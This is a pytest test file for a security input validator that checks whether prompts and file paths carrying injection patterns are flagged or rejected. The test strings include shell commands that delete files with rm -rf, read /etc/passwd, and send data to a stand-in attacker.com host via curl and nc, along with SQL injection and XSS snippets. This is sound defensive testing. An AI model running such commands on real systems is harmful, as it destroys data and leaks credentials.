#!/usr/bin/env python3
"""
Tests for Input Validator.

Comprehensive security testing for user input validation and sanitization.
"""

import pytest

from omninode_bridge.security.exceptions import SecurityValidationError
from omninode_bridge.security.input_validator import InputValidator


class TestInputValidator:
    """Test suite for InputValidator."""

    @pytest.fixture
    def validator(self):
        """Create input validator instance."""
        return InputValidator(strict_mode=False)

    @pytest.fixture
    def strict_validator(self):
        """Create strict mode validator instance."""
        return InputValidator(strict_mode=True)

    # ===== Basic Validation Tests =====

    def test_valid_simple_prompt(self, validator):
        """Test validation of simple valid prompt."""
        prompt = "Create a database CRUD node for users"
        result = validator.validate_prompt(prompt)

        assert result.is_valid is True
        assert len(result.warnings) == 0
        assert result.severity == "low"

    def test_empty_prompt_rejected(self, validator):
        """Test that empty prompts are rejected."""
        with pytest.raises(SecurityValidationError, match="cannot be empty"):
            validator.validate_prompt("")

        with pytest.raises(SecurityValidationError, match="cannot be empty"):
            validator.validate_prompt("   ")

    def test_prompt_length_limit(self, validator):
        """Test maximum prompt length enforcement."""
        # Just under limit should pass
        long_prompt = "x" * (InputValidator.MAX_PROMPT_LENGTH - 1)
        result = validator.validate_prompt(long_prompt)
        assert result.is_valid is True

        # Over limit should fail
        too_long = "x" * (InputValidator.MAX_PROMPT_LENGTH + 1)
        with pytest.raises(SecurityValidationError, match="exceeds maximum length"):
            validator.validate_prompt(too_long)

    # ===== Command Injection Tests =====

    def test_shell_metacharacters_detected(self, validator):
        """Test detection of shell metacharacters in dangerous contexts."""
        # Test metacharacters with dangerous command contexts
        dangerous_prompts = [
            "Create a node; rm -rf /tmp/data",
            "Build API && curl http://attacker.com/steal",
            "Generate code with backtick `whoami` command",
            "Create node with command substitution $(cat /etc/passwd)",
        ]

        for prompt in dangerous_prompts:
            try:
                result = validator.validate_prompt(prompt)
                # If validation passes, check warnings
                assert len(result.warnings) > 0
                assert result.severity in ["medium", "high"]
                assert any(
                    "Shell" in w or "command" in w.lower() for w in result.warnings
                )
            except SecurityValidationError:
                # If rejected due to multiple high-severity issues, that's also valid
                pass

    def test_multiple_shell_metacharacters_rejected(self, validator):
        """Test that multiple shell metacharacters are rejected."""
        prompt = "Create a node; rm -rf / && cat /etc/passwd | nc attacker.com"

        with pytest.raises(SecurityValidationError, match="security concerns"):
            validator.validate_prompt(prompt)

    def test_strict_mode_rejects_immediately(self, strict_validator):
        """Test strict mode rejects on first high-severity pattern."""
        prompt = "Create a node; rm -rf /"

        from omninode_bridge.security.exceptions import CommandInjectionDetected

        with pytest.raises(CommandInjectionDetected):
            strict_validator.validate_prompt(prompt)

    # ===== Path Traversal Tests =====

    def test_path_traversal_detected(self, validator):
        """Test detection of path traversal attempts."""
        dangerous_prompts = [
            "Create a node for ../../directory",
            "Generate code in ..\\..\\windows",
            "Build API with ../../../data",
        ]

        for prompt in dangerous_prompts:
            try:
                result = validator.validate_prompt(prompt)
                assert len(result.warnings) > 0
                assert any("Path traversal" in w for w in result.warnings)
            except SecurityValidationError:
                # May be rejected if combined with other patterns
                pass

    # ===== SQL Injection Tests =====

    def test_sql_injection_detected(self, validator):
        """Test detection of SQL injection patterns."""
        dangerous_prompts = [
            "Create a node with query: ' OR 1=1 --",
            "Generate API that checks: admin' OR '1'='1",
            "Create a query with: ' OR 'x'='x' --",
        ]

        for prompt in dangerous_prompts:
            try:
                result = validator.validate_prompt(prompt)
                assert len(result.warnings) > 0
                assert any(
                    "SQL injection" in w or "Dangerous SQL" in w
                    for w in result.warnings
                )
            except SecurityValidationError:
                # May be rejected if pattern is too dangerous
                pass

    # ===== XSS Tests =====

    def test_xss_detection(self, validator):
        """Test detection of XSS patterns."""
        dangerous_prompts = [
            "Create a node with <script>code</script>",
            "Generate code with javascript:alert",
            "Build API with <script src='file.js'>",
        ]

        for prompt in dangerous_prompts:
            try:
                result = validator.validate_prompt(prompt)
                assert len(result.warnings) > 0
                assert any("XSS" in w or "JavaScript" in w for w in result.warnings)
            except SecurityValidationError:
                # May be rejected if multiple issues detected
                pass

    # ===== Dynamic Code Execution Tests =====

    def test_dynamic_import_detected(self, validator):
        """Test detection of dynamic import patterns."""
        dangerous_prompts = [
            "Create a node using __import__('os')",
            "Generate code with exec(malicious_code)",
            "Build API with eval(user_input)",
        ]

        for prompt in dangerous_prompts:
            result = validator.validate_prompt(prompt)
            assert len(result.warnings) > 0
            assert result.severity == "high"

    # ===== File System Access Tests =====

    def test_sensitive_file_access_detected(self, validator):
        """Test detection of sensitive file access."""
        dangerous_prompts = [
            "Create a node that reads /etc/passwd",
            "Generate code to access /var/www/html",
        ]

        for prompt in dangerous_prompts:
            result = validator.validate_prompt(prompt)
            assert len(result.warnings) > 0
            assert any(
                "sensitive" in w.lower() or "/etc/" in w or "/var/" in w
                for w in result.warnings
            )

    # ===== Network Operation Tests =====

    def test_network_operations_detected(self, validator):
        """Test detection of network operations."""
        prompts_with_network = [
            "Create a node that uses curl to download",
            "Generate code with wget command",
        ]

        for prompt in prompts_with_network:
            result = validator.validate_prompt(prompt)
            # Network operations are low severity - may be legitimate
            if len(result.warnings) > 0:
                assert result.severity in ["low", "medium"]

    # ===== Sanitization Tests =====

    def test_sanitization_removes_nulls(self, validator):
        """Test sanitization removes null bytes."""
        prompt = "Create a node\x00with nulls"
        result = validator.validate_prompt(prompt)

        assert "\x00" not in result.sanitized_input

    def test_sanitization_normalizes_whitespace(self, validator):
        """Test sanitization normalizes whitespace."""
        prompt = "Create   a    node\n\n\nwith  excessive   whitespace"
        result = validator.validate_prompt(prompt)

        # Should have single spaces
        assert "  " not in result.sanitized_input
        assert "\n" not in result.sanitized_input

    def test_sanitization_trims_input(self, validator):
        """Test sanitization trims leading/trailing whitespace."""
        prompt = "   Create a node   "
        result = validator.validate_prompt(prompt)

        assert result.sanitized_input == "Create a node"

    # ===== File Path Validation Tests =====

    def test_valid_file_path(self, validator):
        """Test validation of legitimate file paths."""
        valid_paths = [
            "generated_nodes/node_database.py",
            "output/contract.yaml",
            "workspace/models/user.py",
        ]

        for path in valid_paths:
            is_valid, warnings = validator.validate_file_path(path)
            assert is_valid is True

    def test_file_path_traversal_rejected(self, validator):
        """Test file path traversal is rejected."""
        from omninode_bridge.security.exceptions import PathTraversalAttempt

        with pytest.raises(PathTraversalAttempt):
            validator.validate_file_path("../../etc/passwd")

    def test_sensitive_path_rejected(self, validator):
        """Test sensitive paths are rejected."""
        sensitive_paths = [
            "/etc/passwd",
            "/var/www/index.php",
            "/root/.ssh/id_rsa",
            "~/.ssh/authorized_keys",
        ]

        for path in sensitive_paths:
            with pytest.raises(SecurityValidationError, match="sensitive path"):
                validator.validate_file_path(path)

    def test_null_byte_in_path_rejected(self, validator):
        """Test null byte injection in file paths is rejected."""
        with pytest.raises(SecurityValidationError, match="Null byte"):
            validator.validate_file_path("/tmp/file\x00.txt")

    def test_absolute_path_warning(self, validator):
        """Test absolute paths generate warnings."""
        is_valid, warnings = validator.validate_file_path("/tmp/valid_file.txt")

        assert is_valid is True
        assert len(warnings) > 0
        assert any("Absolute path" in w for w in warnings)

    # ===== API Key Validation Tests =====

    def test_valid_api_key(self, validator):
        """Test validation of legitimate API keys."""
        valid_key = "sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx234yz"
        is_valid, warnings = validator.validate_api_key(valid_key)

        assert is_valid is True

    def test_short_api_key_warning(self, validator):
        """Test short API keys generate warnings."""
        short_key = "short123"
        is_valid, warnings = validator.validate_api_key(short_key)

        assert is_valid is True
        assert len(warnings) > 0
        assert any("suspiciously short" in w for w in warnings)

    def test_dummy_api_key_warning(self, validator):
        """Test dummy/test API keys generate warnings."""
        dummy_keys = ["test-key-12345", "dummy-api-key", "fake-token-xyz"]

        for key in dummy_keys:
            is_valid, warnings = validator.validate_api_key(key)
            assert len(warnings) > 0
            assert any("test/dummy" in w for w in warnings)

    def test_api_key_with_spaces_warning(self, validator):
        """Test API keys with spaces generate warnings."""
        key_with_spaces = "sk-proj abc123 def456"
        is_valid, warnings = validator.validate_api_key(key_with_spaces)

        assert len(warnings) > 0
        assert any("contains spaces" in w for w in warnings)

    # ===== Edge Cases =====

    def test_unicode_characters_allowed(self, validator):
        """Test Unicode characters in prompts are allowed."""
        prompt = "Create a node for 用户管理 (user management)"
        result = validator.validate_prompt(prompt)

        assert result.is_valid is True

    def test_legitimate_code_examples_allowed(self, validator):
        """Test legitimate code examples in prompts are allowed."""
        prompt = """
        Create a node that implements:
        def process_data(input_data):
            return {"status": "success", "data": input_data}
        """
        result = validator.validate_prompt(prompt)

        # May have warnings but should not be rejected
        assert result.is_valid is True
